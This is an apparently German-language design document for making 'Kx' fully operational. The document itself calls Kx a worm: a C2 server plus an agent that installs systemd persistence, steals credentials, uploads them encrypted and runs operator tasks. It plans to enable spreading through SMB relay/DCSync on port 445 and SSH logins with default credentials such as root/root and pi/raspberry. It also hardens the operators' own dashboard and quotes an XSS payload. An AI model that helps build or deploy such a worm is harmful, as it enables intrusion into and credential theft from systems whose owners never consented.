# C2-Operability: Der Kx-Stack wird end-to-end lauffähig

* **Author:** Alexander Schneider
* **Status:** Draft
* **Date:** 2026-11-11

--------------------------------------------------------------------------------

## Overview

Der Kx-Workspace besteht aus neun Crates und ist in der aktuellen Form **nicht
durchgängig lauffähig**. Das Dateiformat `KXENC` v1, die Fehlerklassifikation und
das C2-Protokoll sind implementiert und durch Tests abgesichert (47 Tests grün,
0 Fehler). Was fehlt, ist der Betrieb: Der C2-Server startet nicht, die
Persistenz des Agenten startet ihn garantiert nie durch, die dokumentierten
Exploit-Pfade sind toter Code, und die im Kern versprochene
Post-Quantum-Verschlüsselung der Beute ist nicht aktiv, weil das Modul, das sie
implementiert, nicht kompiliert wird.

Dieses Design behebt die elf im Epic `c2-operability` dokumentierten Defekte und
zwei weitere, die bei der Verifikation dieses Designs zusätzlich gefunden wurden:
Die gesamte C2-API ist **unauthentifiziert** erreichbar (ISSUE-12), und das
Dashboard rendert die Beutefelder ohne Escaping — gespeichertes XSS im Browser des
Operators (ISSUE-13).

Das Design arbeitet in zwei Wellen. **Welle 1** stellt den Betrieb her: Server
startet, Agent startet durch, Beute wird verschlüsselt transportiert. **Welle 2**
schließt die verbliebenen Funktionslücken. Die security-relevanten Befunde werden
in Welle 1 mitgezogen, weil eine lauffähige, ungeschützte C2-API schlimmer ist als
eine, die gar nicht startet.

## The Problem

Der Wurm besteht aus zwei Hälften, die nie zusammen geprüft wurden. Die
Dokumentation beschreibt einen durchgängigen Ablauf: Server starten, Agent
verbindet sich, Scannt Ziele, extrahiert Credentials, lädt sie verschlüsselt hoch,
der Operator sieht sie im Dashboard, legt Tasks an, der Agent führt sie aus.

Der Start-Smoke-Test aus dem Epic widerlegt diese Beschreibung beim ersten Schritt:

```
thread 'main' panicked at rustls-0.23.46/src/crypto/mod.rs:249:14:
Could not automatically determine the process-level CryptoProvider from Rustls crate features.
   3: <rustls::server::server_conn::ServerConfig>::builder_with_protocol_versions
   4: kx_tls::generate_server_tls
   5: kx_server::main::{closure#0}
```

Der Server beendet sich sofort. Alles dahinter — Agent, Scan, Exploit, Upload,
Dashboard — ist ungetestet, weil kein Server läuft, an dem man es testen könnte.

Die Defekte sind nicht gleichartig. Es gibt drei Klassen:

**Klasse A — Der Ablauf ist blockiert.** Der Server startet nicht (ISSUE-1). Die
Persistenz-Unit startet das Binary ohne Argumente, obwohl `--server` und
`--token` zwingend sind, zusammen mit `Restart=always` und `RestartSec=5` eine
Neustart-Schleife (ISSUE-10). Ohne beides ist der Wurm funktionsunfähig.

**Klasse B — Der dokumentierte Zweck ist nicht eingelöst.** Das `hostkey`-Modul
implementiert den Hybrid-KEM (X25519 + ML-KEM-768) und ist per TODO auskommentiert
(ISSUE-9). Der `ml-kem`-Pin im Workspace wird von `kx-core` umgangen, weil das Crate
`ml-kem` eigenständig deklariert (ISSUE-8). Beide Exploit-Pfade des Agenten sind
Platzhalter: `try_default_credentials` gibt konstant `Ok(None)` zurück, und Port 445
fehlt in `COMMON_PORTS`, sodass der SMB-Relay-Zweig nie betreten wird (ISSUE-2,
ISSUE-3). Der `Task`-Typ in `kx_core::c2` hat keinen Befüllungspfad: `Db::insert_task`
hat keinen Aufrufer, und `wmi_exec` hat keinen Aufrufer (ISSUE-6, ISSUE-7).

**Klasse C — Qualität und Hygiene.** Der Credential-Manager-Parser liefert bei genau
einem gespeicherten Credential eine leere Liste (ISSUE-4). Das C2-Token ist über
`Args` als `Debug` ableitbar (ISSUE-11). Ein Nutzungskommentar nennt ein Flag, das
nicht existiert (ISSUE-5).

Die Klasse-A-Defekte blockieren alles andere. Ein Korrektur-Plan, der Klasse B vor
Klasse A bearbeitet, produziert Code, den niemand ausführen kann.

### Der zwölfte Befund: die API ist ungeschützt

Bei der Verifikation dieses Designs — der Server laufen ließ, um ISSUE-1 zu prüfen —
zeigte sich, dass **kein einziger Handler die Authentifizierung erzwingt**:

```rust
// crates/kx-server/src/auth.rs
pub struct Authenticated;

impl<S> axum::extract::FromRequestParts<S> for Authenticated { /* ... */ }
```

`Authenticated` ist definiert, aber kein Handler nimmt den Extractor als Parameter
entgegen. In `crates/kx-server/src/main.rs` wird keine Middleware und kein
`from_fn`-Layer eingehängt. Der Compiler sagt es beim Build:

```
warning: field `token` is never used          --> crates/kx-server/src/main.rs:63:5
warning: function `verify` is never used       --> crates/kx-server/src/auth.rs:16:8
warning: struct `Authenticated` is never constructed
```

Empirisch bestätigt:

| Anfrage | Ergebnis |
|---|---|
| `GET /api/hosts` ohne `Authorization`-Header | **HTTP 200**, Hosts-Liste |
| `GET /api/hosts` mit falschem Token | **HTTP 200**, Hosts-Liste |
| `POST /api/register` ohne Token | **HTTP 201**, Host wird angelegt |

`verify()` vergleicht das Token korrekt — die Funktion wird nur nie aufgerufen.
Der Token wird vom Server beim Start korrekt generiert und in `KX_SERVER_TOKEN`
gelegt; er schützt nichts.

Der Drift-Report hat diesen Widerspruch bereits gesehen, aber als
**Dokumentationsdrift** und nicht als Code-Defekt geführt: `kx/README.md:32`
beschreibt den Server als „axum-API mit SQLite-Persistenz, **Token-Auth** und
selbstsigniertem TLS", und der Report notiert, es gebe „keine
Token-Durchsetzung". Er ist deshalb nicht als eines der elf Code-Issues in das
Epic eingeflossen. Das ist eine Lücke in der Triage: ein Widerspruch zwischen
Dokumentation und Code ist kein Doku-Problem, wenn die Dokumentation eine
Sicherheitseigenschaft behauptet, die der Code nicht hat.

Das ist zugleich ein Widerspruch zur eigenen Dokumentation:
`kx-server/src/main.rs:5` beschreibt den Server als „Bearer-Token geschützt".
Der Contract behauptet eine Sicherheitseigenschaft, die der Code nicht hat.
Deshalb gehört der Fix in Welle 1: eine startende, ungeschützte C2-API ist ein
schlimmerer Zustand als eine nicht startende.

### Der dreizehnte Befund: das Dashboard rendert Beutefelder ohne Escaping

Beim Prüfen des D2-Entwurfs (Dashboard-Zugriff) fiel auf, dass das Dashboard die
API-Werte per `innerHTML` setzt, ohne sie zu escapen
(`kx-server/src/dashboard.rs:30-32`). Der Server legt die gelieferten Strings
unverändert ab. End-to-End verifiziert gegen den laufenden Server:

```
POST /api/register  {"host_id":"10.0.0.5", …, "hostname":"<img src=x onerror=alert(1)>"}
→ HTTP 201
GET /api/hosts     → HTTP 200, body enthält: <img src=x onerror=alert(1)>
```

Der Wert landet unescaped in `<td>${x}</td>` und wird per `innerHTML` gesetzt —
er wird ausführbares Markup im Browser des Operators, in dem Kontext, in dem die
Credential-Passwörter stehen. Betroffen sind alle per API gelieferten Felder:
`hostname`, `os`, `command`, `result`, `username`, `password`.

Dazu kommt die zweite Eigenschaft: das Token steht im Query-String
(`dashboard.rs:27`), also in Browser-Historie, Adressleiste, Server-Logs und
jedem geteilten Dashboard-Link.

Beides gehört in dieselbe Welle wie der Auth-Bypass, und die Reihenfolge ist
festgelegt: **erst escapen, dann das HTML-Login einführen.** Solange ein
injiziertes `<script>` ausgeführt wird, kann es das Token auslesen — und das
Token steht nach der Umstellung im Arbeitsspeicher des Browsers. Wer das Login
zuerst baut, verschlechtert die Lage in der Zwischenzeit.

## Goals

* Der C2-Server startet mit `./target/release/kx-server --host 127.0.0.1 --port 8443
  --db /tmp/kx.db --token test` und liefert die API-Übersicht — ohne Panic, ohne
  Feature-Konflikt.
* Jede Anfrage an `/api/register`, `/api/heartbeat`, `/api/secrets`, `/api/hosts`
  und `/api/tasks` ohne korrektes Bearer-Token wird mit **HTTP 401** abgewiesen.
* Das Dashboard escapet alle API-Werte, sodass ein Host mit HTML im `hostname`
  als Text erscheint und nicht als ausführbares Markup; und es nimmt das Token
  über ein HTML-Login-Formular, nicht aus dem Query-String.
* Die unter unix geschriebene systemd-Unit startet den Agenten mit gültigen
  Argumenten und läuft nicht in eine Neustart-Schleife.
* Die Beute wird vor dem Upload mit dem Hybrid-KEM verschlüsselt: `hostkey` ist
  kompiliert, `kx_core::c2` trägt den Master-Key-Schritt, und `kx-core` löst genau
  die gepinnte `ml-kem`-Version auf.
* Beide Exploit-Pfade des Agenten sind ausführbar: ein Host mit offenem Port 445
  löst den SMB-Relay-Zweig aus, und ein Host mit offenem Port 22 löst den
  Default-Credential-Zweig aus.
* Der Operator kann einen Task anlegen; er erscheint in `GET /api/tasks` und wird
  vom Agenten ausgeführt.
* `cargo test --workspace` bleibt grün, und die Testzahl steigt nicht durch
  Tests, die nur die Existenz von Konstanten prüfen.

## Non-Goals

* **Keine neuen Exploit-Techniken.** `try_default_credentials` wird von einem
  Platzhalter zu einer echten Implementierung für die bereits vorhandenen
  `DEFAULT_CREDENTIALS` — nicht zu einer Credential-Spray-Engine.
* **Kein Neubau des `KXENC`-Formats.** Das Format ist versioniert und von einer
  Änderung ausgeschlossen. Welle 1 ändert keine Byte im Footer.
* **Keine Änderung der Strictness-Regel aus ADR-0001.** Antworttypen bleiben strikt,
  Request-Typen bleiben lenient. Zwei additive Erweiterungen sind damit
  vereinbar und in D2 und D5 entschieden: der neue Response-Pfad `PATH_LOGIN`
  (D2) und die optionalen Master-Key-Felder in `RegisterRequest` und
  `SecretUpload` (D5). Beide erweitern den Vertrag, sie ändern seine Regeln
  nicht — und keine bestehende Feldmenge wird umbenannt oder entfernt.
* **Keine Windows-Arbeit.** `kx-win` ist auf Windows-Persistenz und
  Secret-Extraktion begrenzt; die betroffenen Pfade sind POSIX-spezifisch. Der
  Credential-Manager-Parser (ISSUE-4) ist Windows-nah und wird mitgezogen, weil
  die Ursache derselbe JSON-Formfehler ist.
* **Kein Neuaufbau der Rustls-Konfiguration.** Der Fix entfernt eine Feature-
  Kollision, er führt keinen eigenen TLS-Stack ein.
* **Keine Änderung an `kx-cli` oder `kx-agent` außerhalb der genannten Punkte.**

## Decisions

Die folgenden Entscheidungen sind getroffen. Jede ist gegen den Code oder durch
einen Prototyp belegt; die Belege stehen bei der jeweiligen Entscheidung.

### D1 — Authentifizierung: Middleware auf einem API-Subrouter

**Entscheidung**: Der Fix ist eine `axum::middleware::from_fn`-Middleware, die per
`route_layer` auf einem **separaten API-Subrouter** liegt. Der Dashboard-Router
bleibt getrennt und wird danach gemerged.

**Beleg**: Axum 0.8.9 wurde in einem Wegwerf-Projekt gegen das reale Verhalten
geprüft. Das Ergebnis ist nicht das, was die Axum-Dokumentation nahelegt, und es
entscheidet die Frage:

| Muster | `/api/x` ohne Token | `/dash` ohne Token | `/nope` ohne Token |
|---|---|---|---|
| `.layer()` auf dem Gesamtrouter | 401 | **401** | **401** |
| `.route_layer()` auf dem Gesamtrouter | 401 | **401** | 404 |
| `.layer()` auf API-Subrouter + `merge` | 401 | 200 | **401** |

Drei Befunde daraus:

1. **`.layer()` schützt nur die vor dem Aufruf registrierten Routen.** Eine danach
   hinzugefügte Route ist ungeschützt — im Test lieferte eine Route, die nach
   `.layer()` hinzugefügt wurde, `200` ohne Token. Das ist eine Fußangel, die
   niemand erwartet.
2. **`route_layer` ist die richtige Wahl für Autorisierung.** Es führt die
   Middleware nur aus, wenn die Anfrage überhaupt auf eine Route trifft. Sonst
   würde ein 404 zu einem 401 werden — ein Unbekannter erfährt so nicht einmal,
   ob ein Pfad existiert.
3. **Das Dashboard darf nicht im geschützten Router liegen.** `GET /` liefert das
   Dashboard-HTML; die Daten holt sich das Dashboard-JavaScript selbst per
   `fetch` mit `Authorization`-Header. Der HTML-Aufruf selbst braucht keinen
   Header — der Browser kann keinen setzen. Deshalb: API-Router geschützt,
   Dashboard-Router offen, zusammengeführt mit `merge`.

**Umsetzung** (Reihenfolge ist entscheidend, siehe Befund 1):

```rust
let api = Router::new()
    .route(PATH_REGISTER, post(register))
    .route(PATH_HEARTBEAT, post(heartbeat))
    .route(PATH_SECRETS, post(upload_secret))
    .route(PATH_HOSTS, get(list_hosts))
    .route(PATH_TASKS, get(list_tasks))
    .route_layer(middleware::from_fn(require_auth));   // route_layer, nicht layer

let app = Router::new()
    .route("/", get(dashboard))
    .merge(api)
    .with_state(state);
```

Die Reihenfolge „alle Routen zuerst, dann `route_layer`" ist zwingend. Eine
später hinzugefügte Route bliebe sonst ungeschützt. Das gehört als Kommentar an
die Stelle, sonst entfernt es der nächste Refactoring.

**Konsequenz für das Dashboard**: Die Dashboard-Seite selbst bleibt ohne Token
erreichbar, die Daten dahinter nicht. Der Token kommt weiterhin als
Query-Parameter (`?token=…`), den das JavaScript ausliest und als Header
mitsendet — das ist der bestehende Mechanismus in `dashboard.rs:27-29` und
muss nicht geändert werden.

### D2 — Dashboard: HTML-Login statt Token in der URL

**Entscheidung**: Das Dashboard bekommt ein **HTML-Login-Formular** statt des
Tokens aus dem Query-String. Der Token wird per Formular eingegeben und im
Browser gehalten; die Daten holt sich das JavaScript weiterhin per `fetch` mit
`Authorization`-Header. Die fünf API-Pfade werden geschützt (D1).

**Begründung**: Der Browser kann bei einem normalen Seitenaufruf keinen
`Authorization`-Header setzen. Ein Header-Pflicht-Dashboard wäre also nur
benutzbar, wenn das Token auf anderem Weg ankommt. Heute ist das der
Query-String (`dashboard.rs:27`: `new URLSearchParams(location.search).get('token')`),
und das hat zwei Nachteile:

* Das Token landet in der Browser-Historie, in der Adressleiste und in den
  Server-Logs. Bei einem Werkzeug, das BeuteCredentials anzeigt, ist der
  Query-String der falsche Ort für ein Geheimnis.
* Beim Teilen eines Dashboard-Links (`https://host:8443/?token=…`) wandert das
  Token mit.

Ein HTML-Formular löst beides: Der Operator gibt das Token ein, es wird per
`fetch` an eine Anmelde-Route geschickt, und der Browser hält es ab da nur noch
im Arbeitsspeicher.

**Mechanik**:

* `GET /` liefert unverändert das Dashboard-HTML. Neu ist darin ein
  **Login-Formular** (`<form id="login">` mit Token-Feld und Abschaltknopf),
  das sichtbar ist, solange kein Token vorliegt.
* Das Formular schickt das Token per `fetch` an einen neuen Endpunkt
  `POST /api/login`. Antwort bei korrektem Token: `200` mit
  `Set-Cookie`-Header; bei falschem Token: `401`.
* Das Token wird **nicht** als Cookie gespeichert — Cookies werden automatisch
  mitgesendet, auch an Fremdseiten, was bei einem C2-Dashboard unerwünscht ist.
  Stattdessen hält das JavaScript das Token in einer Variable und schickt es bei
  jedem `fetch` als `Authorization`-Header mit. Beim Neuladen der Seite ist es
  verloren, der Operator meldet sich erneut an.
* Nach erfolgreicher Anmeldung blendet das JavaScript das Formular aus, lädt
  die drei Tabellen und füllt sie.

**Warum kein Cookie**: Ein `HttpOnly`-Cookie wäre gegen XSS geschützt, bringt
aber die CSRF-Problematik mit — ein Cookie wird vom Browser automatisch
mitgesendet, ein `Authorization`-Header nicht. Für ein Dashboard, das
Credential-Passwörter anzeigt, ist das der importantere Unterschied.

**Zusätzlich zu beachten (Fund aus der Prüfung von D2)**: Das Dashboard setzt
die API-Werte per `innerHTML` in die Tabelle (`dashboard.rs:32-33`), ohne die
Werte zu escapen. Ein Host, dessen `hostname` oder `os` HTML enthält, wird
dort zu Markup. Solange das Token nur im Query-String stand, war das eine
Darstellungsfrage; sobald das Token im Browser-Arbeitsspeicher liegt, ist es
eine Token-Diebstahl-Lücke: ein injiziertes `<script>` kann das Token auslesen
und an einen Angreifer senden.

Deshalb gehört zur Umsetzung von D2 **verpflichtend**, dass die Werte vor dem
Einsetzen escapet werden (`textContent` statt `innerHTML`, oder ein
`escapeHtml()`-Helper vor dem Zusammenbau der Zeile). Das ist eine
Vorbedingung, keine Optimierung: ohne Escaping verschlechtert die
Login-Umstellung die Sicherheitslage, statt sie zu verbessern.

**Vertragsfolgen**: `kx_core::c2` bekommt einen neuen Pfadkonstanten
`PATH_LOGIN` und damit einen neuen Vertragspfad. Nach ADR-0001 ist das ein
**Response**-Pfad, also strikt: das Key-Set-Pinning in `c2.rs` und der
Dashboard-Contract in `kx-server/src/README.md` müssen den neuen Pfad
aufnehmen. Der Pfad ist **kein** geschützter API-Pfad im Sinne von D1 — er
prüft das Token, das er entgegennimmt — und gehört deshalb nicht in den
geschützten API-Subrouter, sondern daneben.

### D3 — Kein CI; die Pin-Umgehung wird strukturell verhindert

**Entscheidung**: Es kommt keine CI-Prüfung. Stattdessen wird die Umgehung
strukturell unmöglich gemacht.

**Begründung**: Das Repository hat **keine** CI — es existiert kein
`.github/workflows/`, und `cargo test --workspace` ist der einzige
Verifikationsweg. Eine CI-Prüfung, die es nicht gibt, wäre eine Prüfung, die
niemand ausführt.

**Stattdessen**: `kx-core/Cargo.toml` deklariert `ml-kem` nicht mehr selbst,
sondern `ml-kem = { workspace = true }`. Damit gibt es genau eine Stelle, an der
die Version festgelegt wird, und `kx-core` kann sie nicht mehr umgehen. Die
Umgehung wird nicht durch eine Prüfung verhindert, sondern dadurch, dass es
keinen zweiten Ort mehr gibt, an dem eine Version stehen könnte.

**Wichtige Korrektur zum Epic**: Die Issue-Datei ISSUE-8 empfahl ursprünglich,
den Workspace-Pin `=0.2.1` zu übernehmen. Das **bricht den Build** —
verifiziert:

`ml-kem` 0.2.1 verlangt `kem` mit der Caret-Version `0.3.0-pre.0`, nicht mit
`=0.3.0-pre.0` wie 0.2.3. Der Caret-Bereich lässt `kem` 0.3.0 zu, und das zieht
`rand_core` 0.10.1 neben die 0.6.4 des Workspaces. Die Folge sind inkompatible
Trait-Definitionen:

```
error[E0107]: trait takes 0 generic arguments but 2 generic arguments were supplied
error[E0053]: method `decapsulate` has an incompatible type for trait
error[E0437]: type `Error` is not a member of trait `::kem::Decapsulate`
```

`ml-kem` 0.2.3 pinnt `kem` exakt auf `=0.3.0-pre.0`, bleibt damit bei
`rand_core` 0.6.4 und baut sauber. Die richtige Entscheidung ist also: den
Workspace-Pin auf **`=0.2.3`** anheben und `kx-core` auf `workspace = true`
umstellen. Verifiziert: `ml-kem` 0.2.3, `kem` 0.3.0-pre.0, genau **eine**
`rand_core`-Version im Lockfile, `cargo build --workspace` grün.

Der Epic-Text „trivial (`workspace = true`)" trifft für die *Form* des Fixes zu,
für die *Version* aber nicht. Die Issue-Datei ISSUE-8 nannte ursprünglich 0.2.1,
und die ist nicht baubar. Korrigiert: ISSUE-8 und der Epic nennen jetzt
`=0.2.3`.

### D4 — Default-Credentials: SSH auf Port 22

**Entscheidung**: Der Default-Credential-Pfad bleibt an SSH (Port 22) gebunden.
Port 22 steht bereits in `COMMON_PORTS`, es kommt also kein neuer Port dazu.

**Begründung**: Die Codebasis ist hier eindeutig, und sie widerspricht der
Annahme im Epic:

* `kx/README.md:270` nennt den Pfad wörtlich: „SSH-Systeme mit
  Default-Credentials testen".
* `propagate.rs:104` ruft `try_default_credentials` genau dann auf, wenn
  `service == "ssh"` ist — und `service_for_port` liefert `"ssh"` nur für
  Port 22.
* Die Issue-Datei ISSUE-3 nennt `ssh2` oder `paramiko` als mögliche
  Implementierung, beides SSH-Bibliotheken.

Die im Epic vermutete Alternative (RDP/SMB) hat keine Grundlage: Der
Aufruf-Zweig ist an `"ssh"` gebunden, nicht an ein Zielsystem. Und
`DEFAULT_CREDENTIALS` enthält mit `admin`/`admin`, `root`/`root`, `pi`/`raspberry`
und `test`/`test` überwiegend Linux-/Netzwerkgeräte-typische Paare; nur
`Administrator`/`Administrator` ist Windows-spezifisch, und ein Fehlversuch gegen
Port 22 kostet nichts außer Zeit.

**Konsequenz**: Es braucht **keine** Änderung an der Portliste für ISSUE-3.
Port 22 steht in `COMMON_PORTS` (Zeile 22). Die Änderung an der Portliste
(ISSUE-2) betrifft ausschließlich 445 und die WMI-Ports.

**Zur Umsetzung**: Es gibt im Workspace keine SSH-Bibliothek, und es soll auch
keine C-Toolchain dazukommen. `russh` 0.54 ist die passende Wahl:

* reines Rust, kein `libssh2`/`openssl` nötig (anders als `ssh2`, das
  `libssh2-sys` mitbringt),
* `rand_core` 0.6.4 — dieselbe Version, die der Workspace schon verwendet, also
  keine zweite RNG-Welt,
* Client **und** Server — nötig für den von ISSUE-3 geforderten Test gegen einen
  lokalen Mock-SSH-Dienst,
* `default-features = false` mit `features = ["ring"]` — die Voreinstellung
  würde `aws-lc-rs` ziehen, also genau die C-Toolchain, die ISSUE-1 gerade
  entfernt.

Verifiziert: `russh` 0.54 mit `--no-default-features --features ring` baut,
`aws-lc-rs` bleibt aus dem Lockfile heraus, `rand_core` bleibt bei 0.6.4.

### D5 — Master-Key-Transport: zusätzliche Felder in `RegisterRequest` und `SecretUpload`

**Entscheidung**: Der Master Key wird als **zusätzliche Felder in den
bestehenden Request-Typen** transportiert — nicht über einen neuen Endpunkt.

* `RegisterRequest` erhält ein optionales Feld für den versiegelten Master Key
  (`Option<String>`, base64).
* `SecretUpload` erhält ein optionales Feld für den daraus abgeleiteten
  Master Key bzw. das Chiffretext-Feld.

**Begründung**: ADR-0001 hat die Strictness genau danach ausgerichtet: Antworttypen
sind strikt, Request-Typen sind lenient, weil „additive Erweiterung hier harmlos"
ist. Beide betroffenen Typen sind Request-Typen. Ein zusätzliches Feld in
`RegisterRequest` bricht keinen älteren Server — genau die Eigenschaft, die
ADR-0001 hergestellt hat, und genau die, die hier gebraucht wird.

Ein eigener Endpunkt wäre die sauberere Modellierung (Schlüsselregistrierung ist
ein eigener Lebenszyklus), würde aber einen neuen **Antworttyp** erzeugen — und
Antworttypen sind per ADR-0001 strikt, mit Key-Set-Pinning. Das wäre ein
größerer Eingriff in den Wire-Vertrag als nötig, für ein Feature, dessen
Protokollseite noch nicht einmal existiert.

**Wichtig**: Das Modul `kx_core::c2` ist die einzige Definition des Wire-Vertrags.
Die neuen Felder gehören dort hin und nicht in den Agenten oder den Server.

### D6 — `sealed_master`-Länge: X25519-only-Modus behält 32 Byte

**Entscheidung**: Im X25519-only-Modus bleibt `sealed_master` 32 Byte
(`X25519_PUB_LEN`). `unseal_master_key` akzeptiert in diesem Modus 32 Byte, im
Hybrid-Modus 1120 Byte. `SEALED_MASTER_LEN` (1120) bleibt die Hybrid-Länge und
wird nicht geändert.

**Begründung**: Der Widerspruch ist real — `encapsulate_host_master_key`
erzeugt im X25519-only-Modus 32 Byte, `unseal_master_key` verlangt exakt 1120.
Auflösen lässt sich das auf zwei Wegen:

* **Auffüllen auf 1120** — der Container wäre immer gleich lang, die
  Modesignierung wäre implizit über die Länge. Das ist ein Formatumbruch: ein
  alter Decryptor, der 1120 Byte erwartet, bekäme in einem neuen Hybrid-Fall
  einen noch nicht existierenden Zustand.
* **Modusabhängige Länge** — die Länge wird durch den `KexId` bestimmt, der
  bereits im Vertrag steht (`ServerPublicKey::kex`). Der Empfänger weiß also
  ohne Zusatzinformation, welche Länge er zu erwarten hat. Es entsteht kein
  Formatumbruch, weil `SEALED_MASTER_LEN` als Konstante unverändert bleibt und
  nur die Prüfung von „immer 1120" auf „1120 im Hybrid-Modus, 32 im
  X25519-Modus" erweitert wird.

Der zweite Weg ist die Wahl, weil der `KexId` die Information ohnehin schon
trägt. Er ändert keine bestehende Zahl im Format.

### D7 — Teststrategie: jeder Fix bekommt einen Test, der seinen Fehler fängt

**Entscheidung**: Zu jedem Fix kommt ein Test, der genau den Defekt fängt, der
behoben wird — nicht ein Test, der die Existenz einer Konstante prüft.

**Begründung**: Die Defekte dieses Epics waren alle untestbar, weil die
beteiligten Pfade nie ausgeführt wurden. Der Start-Panic ist ein
Laufzeitfehler. Der Auth-Bypass ist ein Logikfehler in der Verdrahtung. Der
`derive_master_key_with_context`-Fehler ist ein Datenflussfehler, der nur
auffällt, wenn zwei verschiedene Eingaben verschiedene Ergebnisse liefern sollen.

| Defekt | Test, der ihn fängt |
|---|---|
| ISSUE-1 CryptoProvider-Panic | Ein Test, der einen `ServerConfig` baut — der Panic tritt genau dort auf |
| ISSUE-12 Auth-Bypass | Requests auf alle fünf Vertragspfade ohne und mit falschem Token |
| ISSUE-13 Dashboard-XSS | Ein Host mit HTML im `hostname` erscheint als **Text**, nicht als Markup |
| ISSUE-13 Token in der URL | Das Dashboard-HTML enthält keine Token-Quelle aus `location.search` |
| ISSUE-13 Login | `POST /api/login` antwortet 401 bei falschem und 200 bei korrektem Token |
| ISSUE-8 Pin-Umgehung | Ein Test, der `ml_kem::MlKem768` direkt benutzt — bei falscher Version schlägt er fehl |
| ISSUE-9 Nullschlüssel | Roundtrip: Bündel erzeugen → einschließen → entschlüsseln → Klartext stimmt |
| ISSUE-9 Länge | Roundtrip in **beiden** Modi, mit Längenprüfung |
| ISSUE-10 Neustartschleife | Der Unit-String wird geprüft: `ExecStart` enthält die Pflichtargumente |
| ISSUE-3 Default-Credentials | Erfolgs- und Misserfolgsfall gegen einen lokalen Mock-SSH-Dienst (`russh` kann Server) |
| ISSUE-4 JSON-Parse | Ein Credential und zwei Credentials — beide Fälle |
| ISSUE-6 Task-Fluss | Task anlegen → in `GET /api/tasks` sichtbar |

Der Mock-SSH-Dienst für ISSUE-3 ist möglich, weil `russh` Client und Server
beides kann — ein Grund, `russh` und nicht `ssh2` zu wählen.

## Critical User Journeys (CUJs)

### CUJ-1: Server starten und die API erreichen

* **Given**: Ein frisch gebauter Workspace, `kx/Cargo.lock` mit gepinnten Features,
  kein laufender Server, freier Port 8443.
* **When**: `cargo build --release` und dann
  `./target/release/kx-server --host 127.0.0.1 --port 8443 --db /tmp/kx.db --token test`.
* **Then**: Der Prozess bleibt laufend und loggt die API-Übersicht mit allen fünf
  Vertragspfaden. Kein Panic, keine Feature-Kollision. `GET /api/hosts` antwortet
  mit `401`, weil kein Token gesendet wurde. `GET /` liefert das Dashboard mit
  Login-Formular; ohne Anmeldung sind die Tabellen leer.

### CUJ-2: Host registrieren und Beute hochladen

* **Given**: Ein laufender Server aus CUJ-1, ein gültiges Token, ein Agent, der
  denselben Server und dasselbe Zertifikat kennt.
* **When**: Der Agent startet mit `--server https://127.0.0.1:8443 --token <token>
  --cert <pfad>`, scannt ein Ziel und extrahiert ein Credential.
* **Then**: Der Host erscheint in `GET /api/hosts` mit `status: "compromised"`, das
  Secret in `GET /api/secrets`. Das `host_id` des Uploads stimmt mit dem des Hosts
  überein — der Server leitet die Kennung nicht mehr aus der IP ab.

### CUJ-3: Beute verschlüsselt transportieren (Hybrid-KEM)

* **Given**: Ein Server mit einem `ServerKeyBundle` (X25519 + ML-KEM-768), ein
  Agent mit demselben Bundle, `kx-core` mit kompiliertem `hostkey`-Modul.
* **When**: Der Agent kapselt den Master Key gegen den Serverkey, transportiert
  `sealed_master` und leitet daraus den Master Key ab.
* **Then**: Der Chiffriertext ist 1120 Byte (`X25519_PUB_LEN` 32 + `MLKEM_CT_LEN`
  1088), der `unseal_master_key` akzeptiert genau diese Länge, und der abgeleitete
  Master Key ist in Server und Agent identisch. Der Hybrid-KEM liefert die
  Rückfallstufe X25519 allein, falls ML-KEM noch nicht verfügbar ist.

### CUJ-4: Auf ein Ziel mit offenem 445 propagieren

* **Given**: Ein Agent, ein erreichbarer Windows-Host mit offenem Port 445.
* **When**: Der Agent scannt das Ziel und wertet den offenen Port aus.
* **Then**: Der SMB-Relay-Zweig wird betreten (`smb_relay_dcsync`), und ein
  erfolgreich erbeutetes Credential erscheint als `source: "smb_relay"` im
  Secret-Upload.

### CUJ-5: Default-Credentials gegen einen offenen Port testen

* **Given**: Ein Agent, ein erreichbarer Host mit offenem Port 22.
* **When**: Der Agent testet die `DEFAULT_CREDENTIALS`.
* **Then**: Der Pfad liefert bei einem Treffer ein `Auth`-Objekt mit Benutzername
  und Passwort; bei keinem Treffer `Ok(None)`. Der Zweig ist nicht mehr
  vorab tot.

### CUJ-6: Task anlegen und ausführen

* **Given**: Ein laufender Server, ein registrierter Host, ein Operator mit
  `kx-cli`.
* **When**: Der Operator legt einen Task an, der Agent holt die offenen Tasks und
  führt sie aus.
* **Then**: Der Task erscheint in `GET /api/tasks` mit `status` und später mit
  `result`. Das Ergebnis erscheint im Dashboard unter demselben Feld.

### CUJ-7: Agent-Persistenz überleben einen Reboot

* **Given**: Ein Agent auf einem unix-System mit systemd, konfiguriert mit
  Server-URL und Token.
* **When**: Der Agent installiert seine Persistenz und systemd startet den Dienst.
* **Then**: Die Unit-Datei enthält ein vollständiges `ExecStart` mit allen
  Pflichtargumenten. Der Dienst läuft. Nach `systemctl restart` startet er erneut
  und gerät nicht in eine Neustart-Schleife.

### CUJ-8: Das Dashboard ansehen

* **Given**: Ein laufender Server aus CUJ-1, ein Operator mit dem C2-Token.
* **When**: Der Operator öffnet `https://127.0.0.1:8443/` und gibt das Token ins
  Login-Formular ein.
* **Then**: Das Formular verschwindet, die drei Tabellen (Hosts, Secrets, Tasks)
  füllen sich. Das Token steht weder in der URL noch in der Browser-Historie.
  Ein Host, dessen `hostname` HTML enthält, erscheint als Text, nicht als
  ausführbares Markup. Nach einem Neuladen der Seite ist das Token verloren und
  das Formular erscheint erneut — die Anmeldung gilt nur für die laufende
  Sitzung.

## Technical Plan

Die Umsetzung erfolgt in zwei Wellen. Welle 1 stellt den Betrieb her; Welle 2
schließt die verbleibenden Lücken.

```
                    WELLE 1 (Betrieb herstellen)
  ┌──────────────────────────────────────────────────────────────────────┐
  │                                                                      │
  │   ISSUE-1 ──► axum-server: tls-rustls ──► tls-rustls-no-provider    │
  │              + rustls-Provider explizit in kx-tls                    │
  │                                                                      │
  │   ISSUE-12 ──► kx-server: Auth-Middleware auf der Router-Ebene      │
  │              + Token-Pflicht für alle 5 Vertragspfade                │
  │                                                                      │
  │   ISSUE-13 ──► kx-server: Dashboard-Werte escapen  (VOR dem Login) │
  │              + HTML-Login statt Token aus dem Query-String           │
  │              + neuer Pfad POST /api/login (Response-Typ, strikt)     │
  │                                                                      │
  │   ISSUE-10 ──► kx-agent: vollständiges ExecStart in der Unit        │
  │              + Token NICHT im Klartext in der Unit                   │
  │                                                                      │
  │   ISSUE-8 ──► kx-core: ml-kem = { workspace = true }  (Voraussetzung)│
  │              │                                                    │
  │              ▼                                                    │
  │   ISSUE-9 ──► kx-core: hostkey.rs auf ml-kem 0.2.x-API umschreiben  │
